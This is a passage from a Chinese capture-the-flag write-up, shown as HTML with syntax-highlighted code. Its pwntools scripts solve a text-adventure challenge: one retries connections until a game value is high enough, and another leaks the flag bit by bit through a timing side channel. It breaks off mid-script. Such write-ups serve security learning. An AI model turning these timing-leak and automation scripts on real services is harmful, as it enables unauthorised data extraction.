<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">break</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">from</span><span style="color: #403F53"> pwn </span><span style="color: #994CC3">import</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span></span>
<span><span style="color: #994CC3">import</span><span style="color: #403F53"> re</span></span>
<span></span>
<span><span style="color: #403F53">count </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span></span>
<span><span style="color: #403F53">max_sanity </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span></span>
<span></span>
<span><span style="color: #994CC3">while</span><span style="color: #403F53"> </span><span style="color: #BC5454">True</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">    sh </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">remote</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #C96765">chal.thuctf.redbud.info</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">50630</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    sh.</span><span style="color: #0C969B">sendlineafter</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">[...]:</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">newgame</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    sh.</span><span style="color: #0C969B">sendlineafter</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">[...]:</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">ouuan</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    sh.</span><span style="color: #0C969B">sendlineafter</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">(y/n)</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">y</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    sh.</span><span style="color: #0C969B">sendlineafter</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">[ouuan]:</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">h</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    sh.</span><span style="color: #0C969B">sendlineafter</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">[ouuan]:</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">h</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    sh.</span><span style="color: #0C969B">sendlineafter</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">[ouuan]:</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">h</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    sh.</span><span style="color: #0C969B">recvuntil</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">Sanity:</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    sanity_line </span><span style="color: #994CC3">=</span><span style="color: #403F53"> sh.</span><span style="color: #0C969B">recvline</span><span style="color: #403F53">().</span><span style="color: #0C969B">decode</span><span style="color: #403F53">()</span></span>
<span><span style="color: #403F53">    sanity </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">int</span><span style="color: #403F53">(</span><span style="color: #4876D6">re.</span><span style="color: #0C969B">findall</span><span style="color: #403F53">(</span><span style="color: #994CC3">r</span><span style="color: #111111">&#39;</span><span style="color: #5CA7E4">\d</span><span style="color: #0C969B">+</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> sanity_line</span><span style="color: #403F53">)</span><span style="color: #111111">[</span><span style="color: #AA0982">0</span><span style="color: #111111">]</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    count </span><span style="color: #994CC3">+=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span></span>
<span><span style="color: #403F53">    max_sanity </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">max</span><span style="color: #403F53">(</span><span style="color: #4876D6">max_sanity</span><span style="color: #111111">,</span><span style="color: #4876D6"> sanity</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">print</span><span style="color: #403F53">(</span><span style="color: #4876D6">sanity</span><span style="color: #111111">,</span><span style="color: #4876D6"> max_sanity</span><span style="color: #111111">,</span><span style="color: #4876D6"> count</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">if</span><span style="color: #403F53"> sanity </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">120</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">        sh.</span><span style="color: #0C969B">close</span><span style="color: #403F53">()</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">continue</span></span>
<span><span style="color: #403F53">    commands </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">&#39;&#39;&#39;</span><span style="color: #C96765">n</span></span>
<span><span style="color: #C96765">n</span></span>
<span><span style="color: #C96765">e</span></span>
<span><span style="color: #C96765">pickup key</span></span>
<span><span style="color: #C96765">w</span></span>
<span><span style="color: #C96765">s</span></span>
<span><span style="color: #C96765">s</span></span>
<span><span style="color: #C96765">e</span></span>
<span><span style="color: #C96765">e</span></span>
<span><span style="color: #C96765">e</span></span>
<span><span style="color: #C96765">pickup trinket</span></span>
<span><span style="color: #C96765">use trinket</span></span>
<span><span style="color: #C96765">w</span></span>
<span><span style="color: #C96765">s</span></span>
<span><span style="color: #C96765">usewith key door</span></span>
<span><span style="color: #C96765">s</span></span>
<span><span style="color: #C96765">s</span></span>
<span><span style="color: #C96765">n</span></span>
<span><span style="color: #C96765">w</span></span>
<span><span style="color: #C96765">w</span></span>
<span><span style="color: #C96765">w</span></span>
<span><span style="color: #C96765">n</span></span>
<span><span style="color: #C96765">pickup key</span></span>
<span><span style="color: #C96765">s</span></span>
<span><span style="color: #C96765">e</span></span>
<span><span style="color: #C96765">e</span></span>
<span><span style="color: #C96765">e</span></span>
<span><span style="color: #C96765">n</span></span>
<span><span style="color: #C96765">n</span></span>
<span><span style="color: #C96765">w</span></span>
<span><span style="color: #C96765">w</span></span>
<span><span style="color: #C96765">n</span></span>
<span><span style="color: #C96765">n</span></span>
<span><span style="color: #C96765">w</span></span>
<span><span style="color: #C96765">w</span></span>
<span><span style="color: #C96765">usewith key door</span></span>
<span><span style="color: #C96765">n</span><span style="color: #111111">&#39;&#39;&#39;</span><span style="color: #403F53">.</span><span style="color: #0C969B">split</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #AA0982">\n</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> c </span><span style="color: #994CC3">in</span><span style="color: #403F53"> commands:</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">print</span><span style="color: #403F53">(</span><span style="color: #4876D6">sh.</span><span style="color: #0C969B">recvuntil</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">[ouuan]:</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span><span style="color: #4876D6">.</span><span style="color: #0C969B">decode</span><span style="color: #403F53">())</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">print</span><span style="color: #403F53">(</span><span style="color: #4876D6">c</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">        sh.</span><span style="color: #0C969B">sendline</span><span style="color: #403F53">(</span><span style="color: #4876D6">c.</span><span style="color: #0C969B">encode</span><span style="color: #403F53">())</span></span>
<span><span style="color: #403F53">    sh.</span><span style="color: #0C969B">interactive</span><span style="color: #403F53">()</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">break</span></span></code></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/darkroom-flag1.76506629.webp"><img srcset="/assets/darkroom-flag1.0f2f1b9e.png" loading="lazy" src="/assets/darkroom-flag1.0f2f1b9e.png" width="780" height="796" alt="flag1"></picture></p>
<h4 id="level-2-2" class="heading"><a href="#level-2-2" class="heading-anchor" aria-label="章节： Level 2" tabindex="-1"></a><span>Level 2</span></h4>
<p>首先走到 FlagRoom<span class="mojikumi-line-end">，</span><code>getflag</code> 后输入非数字可以看到报错<span class="mojikumi-line-end">：</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Python 代码块" data-v-ad49d235>Python</h5><ile-root id="ile-6"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-6--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #D6DEEB">    </span><span style="color: #F78C6C">248</span><span style="color: #D6DEEB">:   </span><span style="color: #C792EA">while</span><span style="color: #D6DEEB"> flag_number:</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #F78C6C">249</span><span style="color: #D6DEEB">:      choice </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">int</span><span style="color: #D6DEEB">(</span><span style="color: #8EACE3">self</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">recv</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">Guess my public key (give me a number): </span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">)</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">decode</span><span style="color: #D6DEEB">())</span></span>
<span><span style="color: #D6DEEB">                    </span><span style="color: #C792EA">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #F78C6C">250</span><span style="color: #D6DEEB">:      </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> flag_number </span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #F78C6C">251</span><span style="color: #D6DEEB">:          p </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">getStrongPrime</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">2048</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #F78C6C">252</span><span style="color: #D6DEEB">:          q </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">getStrongPrime</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">2048</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #F78C6C">253</span><span style="color: #D6DEEB">:      flag_number </span><span style="color: #C792EA">&gt;&gt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #403F53">    </span><span style="color: #AA0982">248</span><span style="color: #403F53">:   </span><span style="color: #994CC3">while</span><span style="color: #403F53"> flag_number:</span></span>
<span><span style="color: #403F53">    </span><span style="color: #AA0982">249</span><span style="color: #403F53">:      choice </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">int</span><span style="color: #403F53">(</span><span style="color: #AA0982">self</span><span style="color: #4876D6">.</span><span style="color: #0C969B">recv</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&quot;</span><span style="color: #C96765">Guess my public key (give me a number): </span><span style="color: #111111">&quot;</span><span style="color: #403F53">)</span><span style="color: #4876D6">.</span><span style="color: #0C969B">decode</span><span style="color: #403F53">())</span></span>
<span><span style="color: #403F53">                    </span><span style="color: #994CC3">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span></span>
<span><span style="color: #403F53">    </span><span style="color: #AA0982">250</span><span style="color: #403F53">:      </span><span style="color: #994CC3">if</span><span style="color: #403F53"> flag_number </span><span style="color: #994CC3">&amp;</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">    </span><span style="color: #AA0982">251</span><span style="color: #403F53">:          p </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">getStrongPrime</span><span style="color: #403F53">(</span><span style="color: #AA0982">2048</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #AA0982">252</span><span style="color: #403F53">:          q </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">getStrongPrime</span><span style="color: #403F53">(</span><span style="color: #AA0982">2048</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #AA0982">253</span><span style="color: #403F53">:      flag_number </span><span style="color: #994CC3">&gt;&gt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span></span></code></pre></div></section>
<p>其中 <code>getStrongPrime</code> 是一个耗时很长的操作<span class="mojikumi-line-end">，</span>所以可以通过时间侧信道获取到 <code>flag_number</code><span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Python 代码块" data-v-ad49d235>Python</h5><ile-root id="ile-7"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-7--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">from</span><span style="color: #D6DEEB"> pwn </span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span></span>
<span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> time</span></span>
<span></span>
<span><span style="color: #D6DEEB">sh </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">remote</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">chal.thuctf.redbud.info</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">52124</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">sendlineafter</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">[...]:</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">newgame</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">sendlineafter</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">[...]:</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">ouuan</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">sendlineafter</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">(y/n)</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">y</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span></span>
<span><span style="color: #D6DEEB">commands </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&#39;&#39;&#39;</span><span style="color: #ECC48D">n</span></span>
<span><span style="color: #ECC48D">n</span></span>
<span><span style="color: #ECC48D">w</span></span>
<span><span style="color: #ECC48D">w</span></span>
<span><span style="color: #ECC48D">s</span></span>
<span><span style="color: #ECC48D">getflag</span><span style="color: #D9F5DD">&#39;&#39;&#39;</span><span style="color: #D6DEEB">.</span><span style="color: #B2CCD6">split</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #F78C6C">\n</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> c </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> commands:</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">print</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">sh.</span><span style="color: #B2CCD6">recvuntil</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">[ouuan]:</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">decode</span><span style="color: #D6DEEB">())</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">print</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">c</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    sh.</span><span style="color: #B2CCD6">sendline</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">c.</span><span style="color: #B2CCD6">encode</span><span style="color: #D6DEEB">())</span></span>
<span></span>
<span><span style="color: #D6DEEB">result </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;&quot;</span></span>
<span><span style="color: #D6DEEB">current </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span></span>
<span><span style="color: #D6DEEB">bit </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span></span>
<span></span>
<span><span style="color: #C792EA">while</span><span style="color: #D6DEEB"> </span><span style="color: #FF5874">True</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">    sh.</span><span style="color: #B2CCD6">sendlineafter</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">number): </span><span style="color: #D9F5DD">&quot;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">1</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    start </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> time.</span><span style="color: #B2CCD6">time</span><span style="color: #D6DEEB">()</span></span>
<span><span style="color: #D6DEEB">    sh.</span><span style="color: #B2CCD6">recvline</span><span style="color: #D6DEEB">()</span></span>
<span><span style="color: #D6DEEB">    end </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> time.</span><span style="color: #B2CCD6">time</span><span style="color: #D6DEEB">()</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> end </span><span style="color: #C792EA">-</span><span style="color: #D6DEEB"> start </span><span style="color: #C792EA">&gt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0.5</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">        current </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> current </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> (</span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">&lt;&lt;</span><span style="color: #D6DEEB"> bit)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> bit </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">7</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">        result </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">chr</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">current</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> result</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C5E478">print</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">result</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> result.</span><span style="color: #B2CCD6">startswith</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">HUCTF{</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">break</span></span>
<span><span style="color: #D6DEEB">        current </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span></span>
<span><span style="color: #D6DEEB">        bit </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">else</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">        bit </span><span style="color: #C792EA">+=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span></span>
<span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">interactive</span><span style="color: #D6DEEB">()</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">from</span><span style="color: #403F53"> pwn </span><span style="color: #994CC3">import</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span></span>
<span><span style="color: #994CC3">import</span><span style="color: #403F53"> time</span></span>
<span></span>
<span><span style="color: #403F53">sh </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">remote</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #C96765">chal.thuctf.redbud.info</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">52124</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">sendlineafter</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">[...]:</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">newgame</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">sendlineafter</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">[...]:</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">ouuan</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">sendlineafter</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">(y/n)</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">y</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span></span>
<span><span style="color: #403F53">commands </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">&#39;&#39;&#39;</span><span style="color: #C96765">n</span></span>
<span><span style="color: #C96765">n</span></span>
<span><span style="color: #C96765">w</span></span>
<span><span style="color: #C96765">w</span></span>
<span><span style="color: #C96765">s</span></span>
<span><span style="color: #C96765">getflag</span><span style="color: #111111">&#39;&#39;&#39;</span><span style="color: #403F53">.</span><span style="color: #0C969B">split</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #AA0982">\n</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> c </span><span style="color: #994CC3">in</span><span style="color: #403F53"> commands:</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">print</span><span style="color: #403F53">(</span><span style="color: #4876D6">sh.</span><span style="color: #0C969B">recvuntil</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">[ouuan]:</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span><span style="color: #4876D6">.</span><span style="color: #0C969B">decode</span><span style="color: #403F53">())</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">print</span><span style="color: #403F53">(</span><span style="color: #4876D6">c</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    sh.</span><span style="color: #0C969B">sendline</span><span style="color: #403F53">(</span><span style="color: #4876D6">c.</span><span style="color: #0C969B">encode</span><span style="color: #403F53">())</span></span>
<span></span>
<span><span style="color: #403F53">result </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;&quot;</span></span>
<span><span style="color: #403F53">current </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span></span>
<span><span style="color: #403F53">bit </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span></span>
<span></span>
<span><span style="color: #994CC3">while</span><span style="color: #403F53"> </span><span style="color: #BC5454">True</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">    sh.</span><span style="color: #0C969B">sendlineafter</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&quot;</span><span style="color: #C96765">number): </span><span style="color: #111111">&quot;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #994CC3">b</span><span style="color: #111111">&quot;</span><span style="color: #C96765">1</span><span style="color: #111111">&quot;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    start </span><span style="color: #994CC3">=</span><span style="color: #403F53"> time.</span><span style="color: #0C969B">time</span><span style="color: #403F53">()</span></span>
<span><span style="color: #403F53">    sh.</span><span style="color: #0C969B">recvline</span><span style="color: #403F53">()</span></span>
<span><span style="color: #403F53">    end </span><span style="color: #994CC3">=</span><span style="color: #403F53"> time.</span><span style="color: #0C969B">time</span><span style="color: #403F53">()</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">if</span><span style="color: #403F53"> end </span><span style="color: #994CC3">-</span><span style="color: #403F53"> start </span><span style="color: #994CC3">&gt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">0.5</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">        current </span><span style="color: #994CC3">=</span><span style="color: #403F53"> current </span><span style="color: #994CC3">+</span><span style="color: #403F53"> (</span><span style="color: #AA0982">1</span><span style="color: #403F53"> </span><span style="color: #994CC3">&lt;&lt;</span><span style="color: #403F53"> bit)</span></span>
